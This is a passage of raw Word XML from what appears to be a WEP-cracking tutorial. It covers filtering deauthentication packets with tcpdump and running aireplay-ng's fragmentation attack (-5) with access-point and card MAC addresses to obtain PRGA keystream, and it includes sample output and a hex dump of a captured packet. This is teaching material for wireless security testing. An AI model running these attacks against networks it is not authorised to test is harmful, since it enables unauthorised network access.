      </w:pPr>
    </w:p>
    <w:p w14:paraId="1C3933F7" w14:textId="77777777" w:rsidR="002A541E" w:rsidRPr="003112DC" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>tcpdump</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -n -e -s0 -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>vvv</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00277615" w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>wlan0mon</w:t>
      </w:r>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> | </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>grep</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>DeAuth</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="4DA1EBA4" w14:textId="77777777" w:rsidR="002A541E" w:rsidRDefault="002A541E" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1CFCAF8A" w14:textId="57D9D5C8"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You may need to tweak the phrase “</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>DeAuth</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>” to pick out the exact packets you want.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5195FB09" w14:textId="77777777" w:rsidR="00EA0EF7" w:rsidRDefault="00EA0EF7" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="07A759A3" w14:textId="54D16F0E" w:rsidR="00540687" w:rsidRDefault="006021C9" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>**USE THE BELOW ATTACKS IF FAKE AUTH FAILS</w:t>
      </w:r>
      <w:r w:rsidR="006D07BF">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>**</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24E6F489" w14:textId="0097D662" w:rsidR="004652D1" w:rsidRDefault="00590FC4" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Step 3</w:t>
      </w:r>
      <w:r w:rsidR="004652D1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> - Use </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="004652D1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>aireplay-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="004652D1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="004652D1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>chopchop</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="004652D1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="004652D1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>fragmenation</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="004652D1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> attack to obtain PRGA</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67119271" w14:textId="5CC1117D"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Start another console session and run:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01CC682F" w14:textId="759116F2" w:rsidR="00EA0EF7" w:rsidRPr="0070331F" w:rsidRDefault="00E46969" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0070331F">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>FRAG</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="282BEEC4" w14:textId="618048BE" w:rsidR="004652D1" w:rsidRPr="008D1EBD" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>aireplay</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -5 -b 00:14:6C:7E:40:80 -h 00:09:5B:EC:EE:F2 </w:t>
      </w:r>
      <w:r w:rsidR="00277615" w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="440A7D93" w14:textId="77777777" w:rsidR="00EA0EF7" w:rsidRPr="00EA0EF7" w:rsidRDefault="00EA0EF7" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="38739664"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Where:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="455D5537" w14:textId="77777777" w:rsidR="004652D1" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>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-5 means the fragmentation attack</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="289B057C" w14:textId="77777777" w:rsidR="004652D1" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>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b</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 00:14:6C:7E:40:80 is the access point MAC address</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E2E2C1A" w14:textId="77777777" w:rsidR="004652D1" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>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00:09:5B:EC:EE:F2 is the MAC address of our card and must match the MAC used in the fake authentication</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C5EDB48" w14:textId="46B7DAE0" w:rsidR="004652D1" w:rsidRDefault="00277615" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>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sidR="004652D1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> is the wireless interface name</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E0F19F8"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The system will respond:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34641D81" w14:textId="5B3A9B83" w:rsidR="004652D1" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7FCCB29B"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Pr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Waiting for a data packet...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AECCEDB"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Read 127 packets...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19C88CCA"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DCDE425"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Size: 114, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>FromDS</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">: 1, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>ToDS</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>: 0 (WEP)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EB63337"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4ED77B4E"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BSSID  </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>=  00:14:6C:7E:40:80</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="3BA22D43"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w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Dest</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">. MAC  </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>=  01:00:5E:00:00:FB</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="57AF3995"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Source MAC  </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>=  00:40:F4:77:E5:C9</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="7840E596"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CB4B13D"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0x0000:  0842 0000 0100 5e00 00fb 0014 6c7e 4080  .B</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>....^</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>.....l~@.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B0053D7"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0x0010:  0040 f477 e5c9 6052 8c00 0000 3073 </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>d265  .@.</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>w</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>..`R</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>....0s.e</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="069D417D"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0x0020:  c402 790b 2293 c7d5 89c5 4136 7283 </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>29df  ..y</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>."</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>.....</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>A6r.).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59E61EEB"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0x0030:  4e9e 5e13 5f43 4ff5 1b37 3ff9 4da4 </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>c03b  N</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>.^._CO..7</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>?.</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>M</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
